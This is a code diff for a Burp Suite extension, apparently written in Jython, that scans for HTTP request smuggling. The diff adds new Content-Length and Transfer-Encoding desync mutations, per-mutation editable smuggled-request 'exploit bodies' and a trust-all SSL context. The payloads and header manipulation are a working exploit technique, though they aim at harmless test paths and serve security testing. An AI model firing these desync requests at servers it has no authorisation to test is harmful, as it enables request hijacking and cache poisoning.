@@ -2,7 +2,7 @@
 from burp import IBurpExtender, IHttpListener, ITab, IScanIssue, IHttpRequestResponse
 from javax.swing import (
     JPanel, JTable, JScrollPane, JButton, JLabel, JTextField,
-    JTextArea, BorderFactory, SwingUtilities, JCheckBox,
+    JTextArea, BorderFactory, SwingUtilities, JCheckBox, JComboBox,
     ListSelectionModel, BoxLayout, Box, JSplitPane
 )
 from javax.swing.table import AbstractTableModel, DefaultTableCellRenderer
@@ -16,7 +16,6 @@ import jarray
 import threading
 from urlparse import urlparse
 
-DEFAULT_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x"
 STATUS_PENDING = "Pending"
 STATUS_RUNNING = "Running"
 STATUS_COMPLETED = "Completed"
@@ -31,17 +30,29 @@ MUTATION_CL_TRACE = "CL TRACE"
 MUTATION_CL_GET = "CL GET"
 MUTATION_CL_CONNECT = "CL CONNECT"
 MUTATION_H2_UPGRADE = "H2-Upgrade"
+MUTATION_CL_BLANK = "CL-blank"
+MUTATION_CL_VALID_TERM = "CL-ValidTerminator"
 MUTATION_TE_OPTIONS = "TE OPTIONS"
 MUTATION_TE_TRACE = "TE TRACE"
 MUTATION_TE_GET = "TE GET"
 MUTATION_TE_HEAD = "TE HEAD"
 MUTATION_TE_CONNECT = "TE CONNECT"
+MUTATION_TE_VALID_TERM = "TE-ValidTerminator"
 
 DEFAULT_CL_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x"
 DEFAULT_TE_BODY = "22\r\nGET /sandboxtest%xx HTTP/1.1\r\nX: x\r\n0\r\n\r\n"
+DEFAULT_CL_VALID_TERM_BODY = "\r\nGET /sandboxtest%xx HTTP/1.1\r\nX: x"
+DEFAULT_TE_VALID_TERM_BODY = "20\r\n0\r\n\r\nGET /test%xx HTTP/1.1\r\nX: x\r\n0\r\n\r\n"
 
-CL_MUTATIONS = [MUTATION_EXPECT, MUTATION_HEAD, MUTATION_CL_OPTIONS, MUTATION_CL_TRACE, MUTATION_CL_GET, MUTATION_CL_CONNECT, MUTATION_H2_UPGRADE]
-TE_MUTATIONS = [MUTATION_TE_OPTIONS, MUTATION_TE_TRACE, MUTATION_TE_GET, MUTATION_TE_HEAD, MUTATION_TE_CONNECT]
+CL_MUTATIONS = [
+    MUTATION_EXPECT, MUTATION_HEAD, MUTATION_CL_OPTIONS, MUTATION_CL_TRACE,
+    MUTATION_CL_GET, MUTATION_CL_CONNECT, MUTATION_H2_UPGRADE,
+    MUTATION_CL_BLANK, MUTATION_CL_VALID_TERM,
+]
+TE_MUTATIONS = [
+    MUTATION_TE_OPTIONS, MUTATION_TE_TRACE, MUTATION_TE_GET,
+    MUTATION_TE_HEAD, MUTATION_TE_CONNECT, MUTATION_TE_VALID_TERM,
+]
 ALL_MUTATIONS = CL_MUTATIONS + TE_MUTATIONS
 
 MUTATION_METHODS = {
@@ -52,12 +63,23 @@ MUTATION_METHODS = {
     MUTATION_CL_GET: "GET",
     MUTATION_CL_CONNECT: "CONNECT",
     MUTATION_H2_UPGRADE: "POST",
+    MUTATION_CL_BLANK: "POST",
+    MUTATION_CL_VALID_TERM: "POST",
     MUTATION_TE_OPTIONS: "OPTIONS",
     MUTATION_TE_TRACE: "TRACE",
     MUTATION_TE_GET: "GET",
     MUTATION_TE_HEAD: "HEAD",
     MUTATION_TE_CONNECT: "CONNECT",
+    MUTATION_TE_VALID_TERM: "POST",
 }
+
+MUTATION_DEFAULT_BODIES = {}
+for _m in CL_MUTATIONS:
+    MUTATION_DEFAULT_BODIES[_m] = DEFAULT_CL_BODY
+MUTATION_DEFAULT_BODIES[MUTATION_CL_VALID_TERM] = DEFAULT_CL_VALID_TERM_BODY
+for _m in TE_MUTATIONS:
+    MUTATION_DEFAULT_BODIES[_m] = DEFAULT_TE_BODY
+MUTATION_DEFAULT_BODIES[MUTATION_TE_VALID_TERM] = DEFAULT_TE_VALID_TERM_BODY
 
 # Shared trust-all SSL context (created once, reused for all sockets)
 _SSL_CTX = None
@@ -335,10 +357,7 @@ class EndpointTableModel(AbstractTableModel):
 
 def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation):
     is_te = mutation in TE_MUTATIONS
-    if is_te:
-        actual_body = DEFAULT_TE_BODY
-    else:
-        actual_body = body_str
+    actual_body = body_str
     body_len = len(actual_body.encode("ascii"))
     analyzed = helpers.analyzeRequest(http_service, raw_request)
     headers = list(analyzed.getHeaders())
@@ -347,7 +366,8 @@ def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation
     parts[0] = method
     headers[0] = " ".join(parts)
     new_headers = [headers[0]]
-    skip_headers = ["expect:", "content-length:", "transfer-encoding:", "connection:", "upgrade:", "http2-settings:"]
+    skip_headers = ["expect:", "content-length:", "transfer-encoding:",
+                    "connection:", "upgrade:", "http2-settings:"]
     for h in headers[1:]:
         lower = h.lower()
         skip = False
@@ -357,13 +377,17 @@ def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation
                 break
         if not skip:
             new_headers.append(h)
+    # Mutation-specific headers
     if mutation == MUTATION_EXPECT:
         new_headers.append("Expect: 100-Continue")
     if mutation == MUTATION_H2_UPGRADE:
         new_headers.append("Connection: Upgrade, HTTP2-Settings")
         new_headers.append("Upgrade: h2c")
         new_headers.append("HTTP2-Settings: AAMAAABkAAQAAP__")
-    if is_te:
+    # Length / encoding header
+    if mutation == MUTATION_CL_BLANK:
+        new_headers.append("Content-Length: ")
+    elif is_te:
         new_headers.append("Transfer-Encoding: chunked")
     else:
         new_headers.append("Content-Length: %d" % body_len)
@@ -415,7 +439,6 @@ class ReplayTask(object):
         entry = self.entry
         helpers = self.extender._helpers
         callbacks = self.extender._callbacks
-        body_str = self.extender.get_exploit_body()
         flag_code = self.extender.get_flag_code()
         mutations = self.extender.get_active_mutations()
         if not mutations:
@@ -431,6 +454,7 @@ class ReplayTask(object):
         # mismatch is reported separately in Burp's Issues tab.
         all_results = {}
         for mutation in mutations:
+            body_str = self.extender.get_exploit_body(mutation)
             m_results, m_mismatch, m_flagged, m_baseline_code, m_baseline_len, m_baseline_rr = (
                 self._run_mutation(entry, mutation, body_str, flag_code))
             for code, cnt in m_results.items():
@@ -662,6 +686,9 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab):
         self._completed_count = 0
         self.TOOL_PROXY = callbacks.TOOL_PROXY
         self.TOOL_INTRUDER = callbacks.TOOL_INTRUDER
+        # Per-mutation editable bodies (copy of defaults, modified by UI)
+        self._mutation_bodies = dict(MUTATION_DEFAULT_BODIES)
+        self._current_body_mutation = ALL_MUTATIONS[0]
         self.table_model = EndpointTableModel()
         self._build_ui()
         callbacks.registerHttpListener(self)
@@ -672,11 +699,24 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab):
     def getUiComponent(self):
         return self._main_panel
 
-    def get_exploit_body(self):
-        text = self._body_area.getText()
+    def get_exploit_body(self, mutation):
+        self._save_current_body()
+        text = self._mutation_bodies.get(mutation, "")
         if not text or text.strip() == "":
-            return DEFAULT_BODY
+            return MUTATION_DEFAULT_BODIES.get(mutation, DEFAULT_CL_BODY)
         return text.replace("\\r\\n", "\r\n").replace("\\n", "\n")
+
+    def _save_current_body(self):
+        text = self._body_area.getText()
+        if text is not None:
+            self._mutation_bodies[self._current_body_mutation] = text
+
+    def _on_mutation_selected(self, event):
+        self._save_current_body()
+        sel = str(self._body_combo.getSelectedItem())
+        self._current_body_mutation = sel
+        body = self._mutation_bodies.get(sel, MUTATION_DEFAULT_BODIES.get(sel, ""))
+        self._body_area.setText(body)
 
     def get_flag_code(self):
         text = self._flag_code_field.getText().strip()
@@ -817,15 +857,21 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab):
                 return comp
         cm.getColumn(4).setCellRenderer(StatusRenderer())
         table_scroll = JScrollPane(self._table)
-        body_panel = JPanel(BorderLayout())
-        body_panel.setBorder(BorderFactory.createTitledBorder("Exploit Body (editable)"))
-        escaped = DEFAULT_BODY.replace("\r\n", "\\r\\n")
-        self._body_area = JTextArea(escaped, 8, 40)
+        body_panel = JPanel(BorderLayout(2, 2))
+        body_panel.setBorder(BorderFactory.createTitledBorder("Exploit Body (per mutation)"))
+        body_top = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
+        body_top.add(JLabel("Mutation:"))
+        self._body_combo = JComboBox(ALL_MUTATIONS)
+        self._body_combo.addActionListener(self._on_mutation_selected)
+        body_top.add(self._body_combo)
+        body_panel.add(body_top, BorderLayout.NORTH)
+        first_mut = ALL_MUTATIONS[0]
+        init_body = self._mutation_bodies.get(first_mut, DEFAULT_CL_BODY)
+        self._body_area = JTextArea(init_body, 8, 40)
         self._body_area.setFont(Font("Monospaced", Font.PLAIN, 12))
         self._body_area.setLineWrap(True)
         body_panel.add(JScrollPane(self._body_area), BorderLayout.CENTER)
-        body_panel.add(JLabel("Use \\r\\n for CRLF. Content-Length auto-calculated."),
-                       BorderLayout.SOUTH)
+        body_panel.add(JLabel("Use \\r\\n for CRLF."), BorderLayout.SOUTH)
         h_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, table_scroll, body_panel)
         h_split.setResizeWeight(0.65)
         self._log_area = JTextArea()
